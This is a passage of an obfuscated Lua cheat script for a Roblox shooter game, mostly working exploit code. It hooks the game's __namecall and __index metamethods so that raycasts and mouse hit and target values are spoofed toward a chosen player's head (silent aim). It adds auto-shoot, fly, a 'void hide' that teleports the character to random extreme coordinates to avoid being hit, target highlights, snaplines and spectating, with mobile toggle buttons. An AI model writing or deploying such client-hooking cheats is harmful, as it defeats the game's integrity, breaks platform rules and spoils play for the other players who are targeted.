    if _243.keys[Enum.KeyCode.D] then _249 = _249 + _58.CFrame.RightVector end
    if _243.keys[Enum.KeyCode.Space] then _249 = _249 + Vector3.new(0, 1, 0) end
    if _243.keys[Enum.KeyCode.LeftControl] then _249 = _249 - Vector3.new(0, 1, 0) end
    if _249.Magnitude > 0 then _249 = _249.Unit end
    _120.AssemblyLinearVelocity = _249 * Options.FlySpeed.Value
end

local function _245()
    local master = Toggles.CFrameFly.Value
    local active = Options.CFrameFlyKeybind:GetState()
    _243.enabled = master and active
    if _243.enabled then
        if not _243.connection then
            _243.connection = _52.RenderStepped:Connect(function() _244() end)
        end
    else
        if _243.connection then
            _243.connection:Disconnect()
            _243.connection = nil
            local _144 = _56.Character
            if _144 then
                local _148 = _144:FindFirstChildOfClass("Humanoid")
                if _148 then _148:ChangeState(Enum.HumanoidStateType.GettingUp) end
            end
        end
    end
end

_254 = _54.InputBegan:Connect(function(_252, _253)
    if _253 then return end
    _243.keys[_252.KeyCode] = true
end)

_255 = _54.InputEnded:Connect(function(_252)
    _243.keys[_252.KeyCode] = false
end)

local function _147()
    local master = Toggles.VoidHide.Value
    local active = Options.VoidHideKeybind:GetState()
    local should_enable = master and active
    if should_enable then
        if not _118 then
            _AA_wasEnabled = Toggles.AutoArmor.Value
            if _120 then
                _119 = _120.CFrame
            end
            _118 = true
            _143()
            _146()
            if _121 then
                _121:Disconnect()
            end
            _121 = _52.Heartbeat:Connect(function()
                if _118 and _120 then
                    local _t = tick()
                    _120.CFrame = CFrame.new(
                        math.floor((_t * 4423) % 999999991) * math.sign(math.sin(_t * 7919)),
                        math.floor((_t * 6287) % 999999973) * math.sign(math.cos(_t * 6421)),
                        math.floor((_t * 3499) % 999999937) * math.sign(math.sin(_t * 8737))
                    ) * CFrame.Angles(
                        (_t * 17) % (math.pi * 2),
                        (_t * 31) % (math.pi * 2),
                        (_t * 53) % (math.pi * 2)
                    )
                end
            end)
        end
    else
        if _118 then
            _118 = false
            if _121 then
                _121:Disconnect()
                _121 = nil
            end
            if _120 and _119 then
                local _148 = _56.Character:FindFirstChildOfClass("Humanoid")
                if _148 then
                    _148.PlatformStand = true
                end
                _120.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                _120.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                _120.CFrame = _119
                task.wait(0.5)
                if _148 then
                    _148.PlatformStand = false
                end
            end
            _119 = nil
            if _AA_wasEnabled then
                _AA_wasEnabled = false
                Toggles.AutoArmor:SetValue(true)
            end
        end
    end
end

Toggles.VoidHide:OnChanged(function(value)
    shared.hitman.misc.voidhide.enabled = value
    _147()
end)

Options.VoidHideKeybind:OnClick(function()
    _147()
end)

Toggles.CFrameFly:OnChanged(function(value)
    _243.master = value
    _245()
end)

Options.CFrameFlyKeybind:OnClick(function()
    _245()
end)

if _56.Character then
    _120 = _56.Character:WaitForChild("HumanoidRootPart", 5)
end

_56.CharacterAdded:Connect(function(_144)
    _120 = _144:WaitForChild("HumanoidRootPart", 5)
end)

local function _149()
    if _105 then return end
    if not _104.active then return end
    if _isMode("auto select") or _isMode("target all") then return end
    if not _104.targetplayer then return end
    _105 = true
    _109 = _104.targetplayer
    _111 = _104.targetplayer
    _110 = _58.CameraSubject
    if _109 and _109.Character then
        _58.CameraSubject = _109.Character
        if _107 then
            _107:Disconnect()
        end
        _107 = _109.CharacterAdded:Connect(function(_144)
            task.wait(1)
            if _105 and _109 == _104.targetplayer then
                _58.CameraSubject = _144
            end
        end)
    end
    if _108 then
        _108:Disconnect()
    end
    _108 = _56.CharacterAdded:Connect(function(_144)
        task.wait(1)
        if _105 and _109 and _109.Character then
            _58.CameraSubject = _109.Character
        end
    end)
    _112 = tick()
end

local function _150()
    _105 = false
    _109 = nil
    _111 = nil
    if _106 then
        _106:Disconnect()
        _106 = nil
    end
    if _107 then
        _107:Disconnect()
        _107 = nil
    end
    if _108 then
        _108:Disconnect()
        _108 = nil
    end
    if _56.Character then
        _58.CameraSubject = _56.Character
    elseif _110 then
        _58.CameraSubject = _110
    end
end

local function _151()
    if not _105 then return end
    if not _109 then return end
    local _152 = tick()
    if _152 - _112 < _113 then
        return
    end
    _112 = _152
    if _109 and _109.Character then
        _58.CameraSubject = _109.Character
    elseif _105 and _56.Character then
        _58.CameraSubject = _56.Character
    end
end

local function _153(_154)
    if not _154 or not _154.Character then return nil end
    local _155 = Options.HighlightFillColor.Value
    local _156 = Options.HighlightOutlineColor.Value
    local _157 = Options.HighlightFillColor.Transparency
    local _158 = Options.HighlightOutlineColor.Transparency
    local _159 = Instance.new("Highlight")
    _159.Name = "TargetHighlight_" .. _154.Name
    _159.FillColor = _155
    _159.OutlineColor = _156
    _159.FillTransparency = _157
    _159.OutlineTransparency = _158
    _159.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    _159.Parent = _154.Character
    local _160 = _154.CharacterAdded:Connect(function(_144)
        task.wait(1)
        if _159 and _159.Parent then
            _159.Parent = _144
        end
    end)
    return {highlight = _159, connection = _160}
end

local function _161()
    for _162, _163 in pairs(_114) do
        if _163.highlight then
            _163.highlight:Destroy()
        end
        if _163.connection then
            _163.connection:Disconnect()
        end
    end
    _114 = {}
    for _, _164 in pairs(_115) do
        _164:Disconnect()
    end
    _115 = {}
end

local function _165()
    -- Highlights are always on (hardcoded), so no toggle check needed
    if not _104.active then
        _161()
        return
    end
    if _isMode("target all") or _isMode("multi") then
        local _166 = _51:GetPlayers()
        local _167 = {}
        for _, _154 in ipairs(_166) do
            if _154 == _56 then continue end
            if _39 > 0 and _154.UserId == _39 then continue end
            if not _WL_Allows(_154) then continue end
            if _154 and _154.Character then
                local _162 = _154.Name
                if _114[_162] then
                    _167[_162] = _114[_162]
                    _114[_162] = nil
                else
                    local _163 = _153(_154)
                    if _163 then
                        _167[_162] = _163
                    end
                end
            end
        end
        for _162, _163 in pairs(_114) do
            if _163.highlight then
                _163.highlight:Destroy()
            end
            if _163.connection then
                _163.connection:Disconnect()
            end
        end
        _114 = _167
    elseif _isMode("auto select") then
        _161()
        if _104.targetplayer and _104.targetplayer.Character and _WL_Allows(_104.targetplayer) then
            if _39 > 0 and _104.targetplayer.UserId == _39 then
                return
            end
            local _162 = _104.targetplayer.Name
            local _163 = _153(_104.targetplayer)
            if _163 then
                _114[_162] = _163
            end
        end
    else
        -- sticky mode (default)
        _161()
        if _104.targetplayer and _104.targetplayer.Character and _WL_Allows(_104.targetplayer) then
            if _39 > 0 and _104.targetplayer.UserId == _39 then
                return
            end
            local _162 = _104.targetplayer.Name
            local _163 = _153(_104.targetplayer)
            if _163 then
                _114[_162] = _163
            end
        end
    end
end

local function _168(_169)
    if _169 and _130 then
        _141()
    end
    if Toggles.ManipulatedText.Value and _169 then
        _134.Visible = true
    else
        _134.Visible = false
    end
    if Toggles.TargetInfo.Value and _169 then
        _135.Visible = true
    else
        _135.Visible = false
    end
end

local function _170()
    if _130 and shared.hitman.visuals.snaplines.position == "mouse" then
        return _54:GetMouseLocation()
    else
        local _171 = _58.ViewportSize
        return Vector2.new(_171.X / 2, _171.Y / 2)
    end
end

local function _172()
    local _144 = _56.Character
    if not _144 then return false end
    local _148 = _144:FindFirstChildOfClass("Humanoid")
    if not _148 or _148.Health <= 0 then return false end
    return true
end

local function _173()
    local _174 = {}
    local _175 = _51:GetPlayers()
    for _, _154 in ipairs(_175) do
        if _154 == _56 then continue end
        if _39 > 0 and _154.UserId == _39 then continue end
        if not _WL_Allows(_154) then continue end
        table.insert(_174, _154)
    end
    return _174
end

local function _178(_154)
    if not Toggles.ProtectedCheck.Value then return false end
    local _144 = _154.Character
    if _144 then
        local _179 = _144:FindFirstChildOfClass("ForceField")
        if _179 then
            return true
        end
    end
    return false
end

local function _180(_154)
    if not Toggles.KnockCheck.Value then return false end
    local _144 = _154.Character
    if _144 then
        local _181 = _144:FindFirstChild("BodyEffects")
        if _181 and _181:FindFirstChild("K.O") then
            return _181["K.O"].Value
        end
    end
    return false
end

local function _182(_154)
    if not _154 then return false end
    if _39 > 0 and _154.UserId == _39 then return false end
    if not _WL_Allows(_154) then return false end
    if _BL_IsBlocked(_154) then return false end
    local _144 = _154.Character
    if not _144 then return false end
    local _148 = _144:FindFirstChildOfClass("Humanoid")
    if not _148 or _148.Health <= 0 then return false end
    if _180(_154) then return false end
    if _178(_154) then return false end
    return true
end

local function _183(_184)
    local _185 = nil
    local _186 = math.huge
    for _, _154 in pairs(_51:GetPlayers()) do
        if _154 == _56 then continue end
        if _39 > 0 and _154.UserId == _39 then continue end
        if not _WL_Allows(_154) then continue end
        if not _154.Character then continue end
        local _144 = _154.Character
        local _148 = _144:FindFirstChildOfClass("Humanoid")
        if not _148 or _148.Health <= 0 then continue end
        if _180(_154) then continue end
        if _178(_154) then continue end
        local _187 = _144:FindFirstChild("Head")
        if _187 then
            local _188, _189 = _58:WorldToScreenPoint(_187.Position)
            if _189 then
                local _190 = Vector2.new(_188.X, _188.Y)
                local _191 = (_184 - _190).Magnitude
                if _191 < _186 then
                    _186 = _191
                    _185 = _154
                end
            end
        end
    end
    return _185
end

local function _192()
    local _184
    if _130 then
        _184 = _54:GetMouseLocation()
    else
        local _171 = _58.ViewportSize
        _184 = Vector2.new(_171.X / 2, _171.Y / 2)
    end
    return _183(_184)
end

local function _193()
    _104.active = false
    _104.targetplayer = nil
    _104.targetpart = nil
    _104.targetposition = nil
    _168(false)
    for i, _139 in ipairs(_136) do
        _139.Visible = false
    end
    for i, _140 in ipairs(_137) do
        _140.Visible = false
    end
    if _105 then
        _150()
    end
    _161()
end

local function _194()
    if not _104.active then
        _135.Text = ""
        return
    end
    if _isMode("target all") or _isMode("multi") then
        local _174 = _173()
        local _195 = 0
        for _, _154 in ipairs(_174) do
            if _182(_154) then
                _195 = _195 + 1
            end
        end
        if #_174 > 0 then
            _135.Text = string.format("everyone [%d/%d]", _195, #_174)
        else
            _135.Text = "no players"
        end
    elseif _104.targetplayer then
        local _154 = _104.targetplayer
        if not _154 then
            _135.Text = ""
            return
        end
        local _144 = _154.Character
        if _144 then
            local _148 = _144:FindFirstChildOfClass("Humanoid")
            if _148 and _148.Health > 0 and not _180(_154) and not _178(_154) then
                if not _180(_154) and _104.lasthealth[_154] then
                    local _196 = _104.lasthealth[_154]
                    if _148.Health < _196 then
                        _131:Play()
                    end
                end
                _104.lasthealth[_154] = _148.Health
                _135.Text = string.format("%s  %.0f/%.0f",
                    _154.DisplayName,
                    math.floor(_148.Health),
                    math.floor(_148.MaxHealth)
                )
            else
                _135.Text = _154.DisplayName .. " (Knocked wait...)"
                _104.lasthealth[_154] = nil
                _104.wasknocked[_154] = nil
            end
        else
            _135.Text = _154.DisplayName .. " (no char)"
            _104.lasthealth[_154] = nil
            _104.wasknocked[_154] = nil
        end
    else
        _135.Text = ""
    end
end

local function _197()
    if not _104.enabled then return end
    if _104.active then
        _193()
    else
        if not _172() then return end
        if _isMode("target all") then
            local _174 = _173()
            if #_174 > 0 then
                _104.active = true
                _104.targetplayer = _174[1]
                if _174[1].Character then
                    _104.targetpart = _174[1].Character:FindFirstChild("Head")
                    if _104.targetpart then
                        _104.targetposition = _104.targetpart.Position
                    end
                    _104.wasknocked[_174[1]] = false
                    local _148 = _174[1].Character:FindFirstChildOfClass("Humanoid")
                    if _148 then
                        _104.lasthealth[_174[1]] = _148.Health
                    end
                end
                _168(true)
                _194()
                if Toggles.Highlight.Value then
                    _165()
                end
                if Toggles.Spectate.Value and _105 then
                    _150()
                end
            else
                _104.active = true
                _104.targetplayer = nil
                _104.targetpart = nil
                _104.targetposition = nil
                _168(false)
            end
        elseif _isMode("auto select") then
            local _185 = _192()
            if _185 and _182(_185) then
                _104.active = true
                _104.targetplayer = _185
                _104.targetpart = _185.Character:FindFirstChild("Head")
                _104.wasknocked[_185] = false
                if _104.targetpart then
                    _104.targetposition = _104.targetpart.Position
                end
                if _185.Character then
                    local _148 = _185.Character:FindFirstChildOfClass("Humanoid")
                    if _148 then
                        _104.lasthealth[_185] = _148.Health
                    end
                end
                _168(true)
                _194()
                if Toggles.Highlight.Value then
                    _165()
                end
                if Toggles.Spectate.Value and _105 then
                    _150()
                end
            else
                _104.active = true
                _104.targetplayer = nil
                _104.targetpart = nil
                _104.targetposition = nil
                _168(false)
            end
        elseif _isMode("multi") then
            local _174 = _173()
            if #_174 > 0 then
                _104.active = true
                _104.targetplayer = _174[1]
                _104.targetplayers = {}
                for _, plr in ipairs(_174) do
                    if _182(plr) and plr.Character then
                        table.insert(_104.targetplayers, plr)
                    end
                end
                if _104.targetplayer and _104.targetplayer.Character then
                    _104.targetpart = _104.targetplayer.Character:FindFirstChild("Head")
                    if _104.targetpart then
                        _104.targetposition = _104.targetpart.Position
                    end
                    _104.wasknocked[_104.targetplayer] = false
                    local _148 = _104.targetplayer.Character:FindFirstChildOfClass("Humanoid")
                    if _148 then
                        _104.lasthealth[_104.targetplayer] = _148.Health
                    end
                end
                _168(true)
                _194()
                if Toggles.Highlight.Value then
                    _165()
                end
                if Toggles.Spectate.Value then
                    _149()
                end
            else
                _104.active = true
                _104.targetplayer = nil
                _104.targetpart = nil
                _104.targetposition = nil
                _168(false)
            end
        else
            local _185 = _192()
            if _185 and _182(_185) then
                _104.active = true
                _104.targetplayer = _185
                _104.targetpart = _185.Character:FindFirstChild("Head")
                _104.wasknocked[_185] = false
                if _104.targetpart then
                    _104.targetposition = _104.targetpart.Position
                end
                if _185.Character then
                    local _148 = _185.Character:FindFirstChildOfClass("Humanoid")
                    if _148 then
                        _104.lasthealth[_185] = _148.Health
                    end
                end
                _168(true)
                _194()
                if Toggles.Highlight.Value then
                    _165()
                end
                if Toggles.Spectate.Value then
                    _149()
                end
            else
                _104.active = true
                _104.targetplayer = nil
                _104.targetpart = nil
                _104.targetposition = nil
                _168(false)
            end
        end
    end
end

local function _198()
    if not Toggles.Line.Value then
        for i, _139 in ipairs(_136) do
            _139.Visible = false
        end
        for i, _140 in ipairs(_137) do
            _140.Visible = false
        end
        return
    end
    if not _104.active then
        for i, _139 in ipairs(_136) do
            _139.Visible = false
        end
        for i, _140 in ipairs(_137) do
            _140.Visible = false
        end
        return
    end
    local _199 = _170()
    local _117 = Options.LineColor.Value
    local _200 = Options.LineColor.Transparency
    if _isMode("target all") or _isMode("multi") then
        local _166 = _51:GetPlayers()
        while #_136 < #_166 do
            local _139 = Drawing.new("Line")
            _139.Color = _117
            _139.Thickness = shared.hitman.visuals.snaplines.thickness
            _139.Transparency = _200
            _139.Visible = false
            _139.ZIndex = 3
            table.insert(_136, _139)
            local _140 = Drawing.new("Line")
            _140.Color = Color3.new(0, 0, 0)
            _140.Thickness = shared.hitman.visuals.snaplines.thickness + 2
            _140.Transparency = _200
            _140.Visible = false
            _140.ZIndex = 2
            table.insert(_137, _140)
        end
        local _201 = 1
        for _, _154 in ipairs(_166) do
            if _154 == _56 then continue end
            if _39 > 0 and _154.UserId == _39 then continue end
            if not _WL_Allows(_154) then continue end
            if _136[_201] and _137[_201] then
                local _144 = _154.Character
                if _144 then
                    local _202 = _144:FindFirstChild("HumanoidRootPart")
                    if _202 then
                        local _203, _204 = _58:WorldToViewportPoint(_202.Position)
                        if _204 then
                            _136[_201].From = _199
                            _136[_201].To = Vector2.new(_203.X, _203.Y)
                            _136[_201].Visible = true
                            _137[_201].From = _199
                            _137[_201].To = Vector2.new(_203.X, _203.Y)
                            _137[_201].Visible = true
                        else
                            _136[_201].Visible = false
                            _137[_201].Visible = false
                        end
                    else
                        _136[_201].Visible = false
                        _137[_201].Visible = false
                    end
                else
                    _136[_201].Visible = false
                    _137[_201].Visible = false
                end
            end
            _201 = _201 + 1
        end
        for i = _201, #_136 do
            if _136[i] then _136[i].Visible = false end
            if _137[i] then _137[i].Visible = false end
        end
    elseif _isMode("auto select") then
        for i, _139 in ipairs(_136) do
            _139.Visible = false
        end
        for i, _140 in ipairs(_137) do
            _140.Visible = false
        end
        if _104.targetplayer then
            local _144 = _104.targetplayer.Character
            if not _144 then return end
            local _202 = _144:FindFirstChild("HumanoidRootPart")
            if _202 then
                local _203, _204 = _58:WorldToViewportPoint(_202.Position)
                if _204 then
                    if #_136 < 1 then
                        local _139 = Drawing.new("Line")
                        _139.Color = _117
                        _139.Thickness = shared.hitman.visuals.snaplines.thickness
                        _139.Transparency = _200
                        _139.Visible = true
                        _139.ZIndex = 3
                        table.insert(_136, _139)
                        local _140 = Drawing.new("Line")
                        _140.Color = Color3.new(0, 0, 0)
                        _140.Thickness = shared.hitman.visuals.snaplines.thickness + 2
                        _140.Transparency = _200
                        _140.Visible = true
                        _140.ZIndex = 2
                        table.insert(_137, _140)
                    end
                    _136[1].From = _199
                    _136[1].To = Vector2.new(_203.X, _203.Y)
                    _136[1].Visible = true
                    _137[1].From = _199
                    _137[1].To = Vector2.new(_203.X, _203.Y)
                    _137[1].Visible = true
                else
                    if _136[1] then _136[1].Visible = false end
                    if _137[1] then _137[1].Visible = false end
                end
            else
                if _136[1] then _136[1].Visible = false end
                if _137[1] then _137[1].Visible = false end
            end
        end
    else
        for i, _139 in ipairs(_136) do
            _139.Visible = false
        end
        for i, _140 in ipairs(_137) do
            _140.Visible = false
        end
        if _104.targetplayer then
            local _144 = _104.targetplayer.Character
            if not _144 then return end
            local _202 = _144:FindFirstChild("HumanoidRootPart")
            if _202 then
                local _203, _204 = _58:WorldToViewportPoint(_202.Position)
                if _204 then
                    if #_136 < 1 then
                        local _139 = Drawing.new("Line")
                        _139.Color = _117
                        _139.Thickness = shared.hitman.visuals.snaplines.thickness
                        _139.Transparency = _200
                        _139.Visible = true
                        _139.ZIndex = 3
                        table.insert(_136, _139)
                        local _140 = Drawing.new("Line")
                        _140.Color = Color3.new(0, 0, 0)
                        _140.Thickness = shared.hitman.visuals.snaplines.thickness + 2
                        _140.Transparency = _200
                        _140.Visible = true
                        _140.ZIndex = 2
                        table.insert(_137, _140)
                    end
                    _136[1].From = _199
                    _136[1].To = Vector2.new(_203.X, _203.Y)
                    _136[1].Visible = true
                    _137[1].From = _199
                    _137[1].To = Vector2.new(_203.X, _203.Y)
                    _137[1].Visible = true
                else
                    if _136[1] then _136[1].Visible = false end
                    if _137[1] then _137[1].Visible = false end
                end
            else
                if _136[1] then _136[1].Visible = false end
                if _137[1] then _137[1].Visible = false end
            end
        end
    end
end

local function _205()
    if not _104.active then return end
    if _isMode("auto select") then
        local _184
        if _130 and shared.hitman.visuals.snaplines.position == "mouse" then
            _184 = _54:GetMouseLocation()
        else
            local _171 = _58.ViewportSize
            _184 = Vector2.new(_171.X / 2, _171.Y / 2)
        end
        local _185 = _183(_184)
        if _185 and _182(_185) then
            if _104.targetplayer ~= _185 then
                _104.targetplayer = _185
                _104.targetpart = _185.Character:FindFirstChild("Head")
                _104.wasknocked[_185] = false
                if _104.targetpart then
                    _104.targetposition = _104.targetpart.Position
                end
                if _185.Character then
                    local _148 = _185.Character:FindFirstChildOfClass("Humanoid")
                    if _148 then
                        _104.lasthealth[_185] = _148.Health
                    end
                end
                _168(true)
                _194()
                if Toggles.Highlight.Value then
                    _165()
                end
                if Toggles.Spectate.Value and _105 then
                    _150()
                end
            else
                if _104.targetplayer.Character then
                    _104.targetpart = _104.targetplayer.Character:FindFirstChild("Head")
                    if _104.targetpart then
                        _104.targetposition = _104.targetpart.Position
                    end
                end
            end
        else
            _104.targetplayer = nil
            _104.targetpart = nil
            _104.targetposition = nil
            _168(false)
            if Toggles.Spectate.Value and _105 then
                _150()
            end
        end
    elseif _isMode("target all") then
        local _174 = _173()
        if #_174 > 0 then
            if _104.targetplayer and not _104.picktime then
                _104.picktime = tick()
            end
            if _104.targetplayer and _104.picktime and tick() - _104.picktime > 10 then
                _104.targetplayer = nil
                _104.picktime = nil
            end
            if not _104.targetplayer or not _182(_104.targetplayer) then
                local _WL_Valid = {}
                for _, _WL_P in ipairs(_174) do
                    if _182(_WL_P) then
                        table.insert(_WL_Valid, _WL_P)
                    end
                end
                if #_WL_Valid > 0 then
                    _104.targetplayer = _WL_Valid[math.random(#_WL_Valid)]
                else
                    _104.targetplayer = nil
                end
                if _104.targetplayer then
                    _104.wasknocked[_104.targetplayer] = false
                    _104.picktime = tick()
                end
            end
            if _104.targetplayer and _104.targetplayer.Character then
                _104.targetpart = _104.targetplayer.Character:FindFirstChild("Head")
                if _104.targetpart then
                    _104.targetposition = _104.targetpart.Position
                end
            end
            _194()
            if Toggles.Highlight.Value then
                _165()
            end
            if Toggles.Spectate.Value and _105 then
                _150()
            end
        else
            _104.targetplayer = nil
            _104.targetpart = nil
            _104.targetposition = nil
            _168(false)
            _161()
            if Toggles.Spectate.Value and _105 then
                _150()
            end
        end
    elseif _isMode("multi") then
        local _184
        if _130 and shared.hitman.visuals.snaplines.position == "mouse" then
            _184 = _54:GetMouseLocation()
        else
            local _171 = _58.ViewportSize
            _184 = Vector2.new(_171.X / 2, _171.Y / 2)
        end
        
        local hoveredPlr = _183(_184)
        if hoveredPlr and _182(hoveredPlr) then
            local alreadySelected = table.find(_104.targetplayers, hoveredPlr)
            
            if not alreadySelected then
                table.insert(_104.targetplayers, hoveredPlr)
            else
                table.remove(_104.targetplayers, alreadySelected)
            end
        end
        
        if #_104.targetplayers > 0 then
            _104.targetplayer = _104.targetplayers[#_104.targetplayers]
            _104.targetpart = _104.targetplayer.Character and _104.targetplayer.Character:FindFirstChild("Head")
            if _104.targetpart then
                _104.targetposition = _104.targetpart.Position
            end
        else
            _104.targetplayer = nil
            _104.targetpart = nil
            _104.targetposition = nil
        end
        
        _168(_104.targetplayer ~= nil)
        _194()
        if Toggles.Highlight.Value then
            _165()
        end
        if Toggles.Spectate.Value and _105 then
            _149()
        end
    else
        if _104.targetplayer and _104.targetplayer.Character then
            _104.targetpart = _104.targetplayer.Character:FindFirstChild("Head")
            if _104.targetpart then
                _104.targetposition = _104.targetpart.Position
            end
        end
    end
end

local function _206()
    if not _104.autoshoot then return end
    if not _104.active then return end
    local _145 = _56.Character and _56.Character:FindFirstChildOfClass("Tool")
    if not _145 then return end
    local _207 = _145:FindFirstChild("Ammo")
    if _207 and _207.Value <= 0 then return end
    if _isMode("target all") or _isMode("multi") then
        local _174 = _173()
        if #_174 == 0 then return end
        local _208 = false
        for _, _154 in ipairs(_174) do
            if _182(_154) then
                _208 = true
                break
            end
        end
        if _208 then
            _145:Activate()
            task.wait(0.1)
        end
    else
        if not _104.targetplayer then return end
        if not _182(_104.targetplayer) then return end
        _145:Activate()
        task.wait(0.1)
    end
end

local function _212()
    local _213 = Options.VoidHideKeybind.Value
    if _213 then
        local _214 = tostring(_213):lower():gsub("enum.keycode.", "")
        shared.hitman.misc.voidhide.key = _214
    end
end

local function _215()
    local _213 = Options.EnabledKeybind.Value
    if _213 then
        local _214 = tostring(_213):lower():gsub("enum.keycode.", "")
        _104.keybind = _214
        shared.hitman.silent.key = _214
    end
end

_215()
_212()
syncStateFromUI()

Options.EnabledKeybind:OnChanged(function()
    _215()
end)

Options.VoidHideKeybind:OnChanged(function()
    _212()
end)

local function _216(input, processed)
    if processed then return end
    if input.KeyCode == Enum.KeyCode[_104.keybind:upper()] then
        _197()
    else
        local _217 = Options.VoidHideKeybind.Value
        if _217 and input.KeyCode == _217 then
            _147()
        end
    end
end

if _130 then
    _54.InputBegan:Connect(_216)
end

if _128 then
    local _218 = Instance.new("TextButton")
    _218.Name = "SkidCheese"
    _218.Parent = _133
    _218.Size = UDim2.new(0, 100, 0, 50)
    _218.Position = UDim2.new(1, -110, 1, -60)
    _218.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    _218.BackgroundTransparency = 0.5
    _218.Text = "Toggle Aim"
    _218.TextColor3 = Color3.fromRGB(255, 255, 255)
    _218.Visible = true
    local _219 = false
    local _220, _221, _222
    _218.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            _219 = true
            _221 = input.Position
            _222 = _218.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    _219 = false
                end
            end)
        end
    end)
    _218.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            _220 = input
        end
    end)
    _54.InputChanged:Connect(function(input)
        if _219 and input == _220 then
            local _223 = input.Position - _221
            _218.Position = UDim2.new(_222.X.Scale, _222.X.Offset + _223.X, _222.Y.Scale, _222.Y.Offset + _223.Y)
        end
    end)
    _218.Activated:Connect(function()
        _197()
    end)
    local _224 = Instance.new("TextButton")
    _224.Name = "legitcheese"
    _224.Parent = _133
    _224.Size = UDim2.new(0, 100, 0, 50)
    _224.Position = UDim2.new(1, -110, 1, -120)
    _224.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    _224.BackgroundTransparency = 0.5
    _224.Text = "Void Hide"
    _224.TextColor3 = Color3.fromRGB(255, 255, 255)
    _224.Visible = true
    local _225 = false
    local _226, _227, _228
    _224.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            _225 = true
            _227 = input.Position
            _228 = _224.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    _225 = false
                end
            end)
        end
    end)
    _224.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            _226 = input
        end
    end)
    _54.InputChanged:Connect(function(input)
        if _225 and input == _226 then
            local _223 = input.Position - _227
            _224.Position = UDim2.new(_228.X.Scale, _228.X.Offset + _223.X, _228.Y.Scale, _228.Y.Offset + _223.Y)
        end
    end)
    _224.Activated:Connect(function()
        _147()
    end)
end

local _229; _229 = hookmetamethod(game, "__namecall", function(...)
    if checkcaller() then return _229(...) end
    local _230 = {...}
    local _44 = getnamecallmethod()
    if not _104.active then
        return _229(...)
    end
    if math.random(100) > _104.hitchance then
        return _229(...)
    end
    if _44:lower() == "raycast" and select(1, ...) == workspace then
        local tp = _104.targetpart
        local tpos = _104.targetposition
        if tp and tpos then
            local delta = tpos - _230[2]
            return {
                Instance = tp,
                Position = tpos,
                Normal = delta.Unit,
                Distance = delta.Magnitude,
                Material = tp.Material
            }
        end
    end
    return _229(...)
end)

if _130 then
    local _57 = _56:GetMouse()
    local _233 = getrawmetatable(game)
    local _234 = _233.__index
    setreadonly(_233, false)
    _233.__index = newcclosure(function(self, key)
        if self == _57 and (key == "Hit" or key == "Target") then
            if _104.active and _isMode("target all") then
                if _104.targetplayer and _104.targetpart then
                    if key == "Hit" then
                        return CFrame.new(_104.targetposition)
                    elseif key == "Target" then
                        return _104.targetpart
                    end
                end
            elseif _104.active and _isMode("multi") then
                if _104.targetplayer and _104.targetpart then
                    if key == "Hit" then
                        return CFrame.new(_104.targetposition)
                    elseif key == "Target" then
                        return _104.targetpart
                    end
                end
            elseif _104.active and _104.targetplayer and _104.targetposition then
                if key == "Hit" then
                    return CFrame.new(_104.targetposition)
                elseif key == "Target" and _104.targetpart then
                    return _104.targetpart
                end
            end
        end
        if self == _57 and (key == "X" or key == "Y") and _104.active then
            local _235
            if _isMode("target all") or _isMode("multi") then
                if _104.targetplayer and _104.targetplayer.Character then
                    local _187 = _104.targetplayer.Character:FindFirstChild("Head")
                    if _187 then
                        _235 = _187.Position
                    end
                end
            elseif _104.targetposition then
                _235 = _104.targetposition
            end
            if _235 then
                local _236 = _58:WorldToViewportPoint(_235)
                return _236[key == "X" and "X" or "Y"]
            end
        end
        return _234(self, key)
    end)
    setreadonly(_233, true)
end

local _237 = _52.RenderStepped:Connect(function()
    if _104.active then
        _205()
        _194()
        _198()
        if _130 then
            _141()
        end
        _206()
        _151()
    else
        _134.Visible = false
        _135.Visible = false
    end
end)

Toggles.Enabled:OnChanged(function(value)
    _104.enabled = value
    shared.hitman.silent.enabled = value
    if not value then
        _104.active = false
        _104.targetplayer = nil
        _104.targetpart = nil
        _104.targetposition = nil
        if _105 then
            _150()
        end
        _161()
    end
end)

Options.Mode:OnChanged(function(value)
    value = string.lower(value)
    _104.mode = value
    _104.currentmode = value
    shared.hitman.silent.mode = value
    if _104.active then
        _198()
        _165()
    end
    if (value == "auto select" or value == "target all" or value == "multi") and _105 then
        _150()
        if Toggles.Spectate.Value then
            Toggles.Spectate:SetValue(false)
        end
    end
end)

Toggles.AutoShoot:OnChanged(function(value)
    _104.autoshoot = value
end)

Toggles.ManipulatedText:OnChanged(function(value)
    if not value then
        _134.Visible = false
    elseif _104.active then
        _134.Visible = true
    end
end)

Toggles.TargetInfo:OnChanged(function(value)
    if not value then
        _135.Visible = false
    elseif _104.active then
        _135.Visible = true
        _194()
    end
end)

Toggles.Line:OnChanged(function(value)
    if not value then
        for i, _139 in ipairs(_136) do
            _139.Visible = false
        end
        for i, _140 in ipairs(_137) do
            _140.Visible = false
        end
    elseif _104.active then
        _198()
    end
end)

Toggles.Spectate:OnChanged(function(value)
    if value then
        if _104.active and _isMode("sticky") then
            _149()
        end
    else
        _150()
    end
end)

Toggles.Highlight:OnChanged(function(value)
    if value then
        if _104.active then
            _165()
        end
    else
        _161()
    end
end)

Toggles.KnockCheck:OnChanged(function(value)
    shared.hitman.checks.knock = value
end)

Toggles.ProtectedCheck:OnChanged(function(value)
    shared.hitman.checks.protected = value
end)

Toggles.WhitelistEnabled:OnChanged(function(value)
    shared.hitman.checks.whitelist.enabled = value
    _WL_RebuildCache()
    _WL_ValidateCurrentTarget()
    if Toggles.Highlight.Value and _104.active then
        _165()
    end
end)

Options.WhitelistPlayers:OnChanged(function()
    _WL_SyncShared()
    _WL_ValidateCurrentTarget()
    if Toggles.Highlight.Value and _104.active then
        _165()
    end
end)

Toggles.BlacklistEnabled:OnChanged(function()
    _BL_RebuildCache()
    _BL_ValidateCurrentTarget()
    if Toggles.Highlight.Value and _104.active then
        _165()
    end
end)

Toggles.AutoBlockFriends:OnChanged(function()
    _BL_ValidateCurrentTarget()
end)
